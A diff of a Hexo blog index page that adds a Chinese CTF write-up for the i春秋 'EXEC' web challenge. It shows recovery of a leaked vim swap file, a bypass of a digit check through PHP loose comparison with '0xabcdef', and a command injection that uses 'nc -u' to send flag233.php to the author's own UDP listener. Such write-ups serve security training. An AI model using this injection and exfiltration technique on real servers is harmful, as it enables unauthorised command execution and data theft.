@@ -66,6 +66,61 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ichunqiu-web-EXEC" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/11/ichunqiu-web-EXEC/" class="article-date">
+  <time datetime="2018-09-11T08:35:23.000Z" itemprop="datePublished">2018-09-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/11/ichunqiu-web-EXEC/">i春秋-Web-EXEC</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>根据提示，是一道命令执行的题。</p>
+<p>打开以后，提示 <code>no sign</code> ，未登录。</p>
+<p>查看源码，看到 <code>meta</code> 信息里有提示，使用了 <code>vim</code>。猜测可能存在 <code>swp</code> 文件泄露。</p>
+<p>直接访问 <code>.index.php.swp</code> ，成功下载。</p>
+<p>使用命令 <code>vim -r .index.php.swp</code> ，恢复文件，获得以下内容。</p>
+<p>整理内容，得到以下代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;blind cmd exec&lt;/title&gt;</span><br><span class="line">&lt;meta language=<span class="string">'utf-8'</span> editor=<span class="string">'vim'</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;img src=pic.gif&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">flag in flag233.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);</span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;</span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'11259375'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">        setcookie(<span class="string">'auth'</span>,<span class="string">'tcp tunnel is forbidden!'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">                $command=$_POST[cmd];</span><br></pre></td></tr></table></figure>
+<p>分析代码，知道需要通过 <code>GET</code> 传入一个 <code>sign</code>参数 ，必须和 <code>11259375</code> 相等，同时参数的每个字符都不能在 <code>1-9</code>之间。</p>
+<p>这里用的是 <code>==</code> ，所以可以传入 <code>0xabcdef</code> 绕过。</p>
+<p>通过外层 <code>if</code> 后，提示 <code>tcp 通道不能使用</code>，然后会执行 <code>cmd</code> 参数的命令。</p>
+<p>这里需要一台服务器监听一个 <code>udp</code> 端口，可以用 <code>nc</code> 实现，</p>
+<blockquote>
+<p>nc -ul 8989</p>
+</blockquote>
+<p><img src="/2018/09/11/ichunqiu-web-EXEC/bp.png" alt="bp"></p>
+<p>传入 <code>cmd=nc -u 服务器地址 端口 &lt; flag233.php</code>，服务器就能接收到 <code>flag233.php</code> 的内容。</p>
+<p><img src="/2018/09/11/ichunqiu-web-EXEC/flag.png" alt="flag"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://CHN-Jaylin.github.io/2018/09/11/ichunqiu-web-EXEC/" data-id="cjlxgobmx0009m0vn1gfzqvqb" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-ichunqiu-web-brute-3" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/09/10/ichunqiu-web-brute-3/" class="article-date">
@@ -96,7 +151,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-brute-3/" data-id="cjlxgivc2000lvwvn0ixzv0vl" class="article-share-link">Share</a>
+      <a data-url="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-brute-3/" data-id="cjlxgobmx000cm0vns2n2w9vz" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
@@ -144,7 +199,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-brute-2/" data-id="cjlxgivc2000ovwvneg3mmtbe" class="article-share-link">Share</a>
+      <a data-url="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-brute-2/" data-id="cjlxgobmh0007m0vnnrq44y9h" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
@@ -197,7 +252,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-SQLi/" data-id="cjlxgivc2000kvwvn43g4htyz" class="article-share-link">Share</a>
+      <a data-url="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-SQLi/" data-id="cjlxgobmh0006m0vn0qaaqzgv" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
@@ -241,7 +296,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://CHN-Jaylin.github.io/2018/09/09/daily-life-20180909/" data-id="cjlxgivc2000fvwvn0e216kk1" class="article-share-link">Share</a>
+      <a data-url="http://CHN-Jaylin.github.io/2018/09/09/daily-life-20180909/" data-id="cjlxgobm20002m0vnbdzq7ikh" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/心路/">心路</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日常/">日常</a></li></ul>
@@ -444,7 +499,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://CHN-Jaylin.github.io/2018/08/07/sql-injection-cheat-sheet/" data-id="cjlxgivc2000qvwvn25kj0a6i" class="article-share-link">Share</a>
+      <a data-url="http://CHN-Jaylin.github.io/2018/08/07/sql-injection-cheat-sheet/" data-id="cjlxgobmx000am0vn4suwi9hr" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql-injection/">sql-injection</a></li></ul>
@@ -487,7 +542,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://CHN-Jaylin.github.io/2018/08/02/exploit-erraticgopher/" data-id="cjlxgivc2000ivwvnfpjdwd7n" class="article-share-link">Share</a>
+      <a data-url="http://CHN-Jaylin.github.io/2018/08/02/exploit-erraticgopher/" data-id="cjlxgobmh0005m0vndp374s9b" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/EXPLOIT/">EXPLOIT</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SMB/">SMB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/远程溢出/">远程溢出</a></li></ul>
@@ -579,7 +634,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://CHN-Jaylin.github.io/2018/08/01/crawl-admin5/" data-id="cjlxgivbm000dvwvndxnosejq" class="article-share-link">Share</a>
+      <a data-url="http://CHN-Jaylin.github.io/2018/08/01/crawl-admin5/" data-id="cjlxgobm20000m0vnnhrjjq5n" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/爬虫/">爬虫</a></li></ul>
@@ -624,7 +679,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://CHN-Jaylin.github.io/2018/07/31/yesterday-and-tomorrow/" data-id="cjlxgivdh0024vwvntigtljpx" class="article-share-link">Share</a>
+      <a data-url="http://CHN-Jaylin.github.io/2018/07/31/yesterday-and-tomorrow/" data-id="cjlxgobnc000em0vnrdcdyhz3" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/心路/">心路</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日常/">日常</a></li></ul>
@@ -681,6 +736,10 @@
       <ul>
         
           <li>
+            <a href="/2018/09/11/ichunqiu-web-EXEC/">i春秋-Web-EXEC</a>
+          </li>
+        
+          <li>
             <a href="/2018/09/10/ichunqiu-web-brute-3/">i春秋-Web-爆破3</a>
           </li>
         
@@ -694,10 +753,6 @@
         
           <li>
             <a href="/2018/09/09/daily-life-20180909/">日常心路-180909</a>
-          </li>
-        
-          <li>
-            <a href="/2018/08/07/sql-injection-cheat-sheet/">SQL注入备忘录</a>
           </li>
         
       </ul>
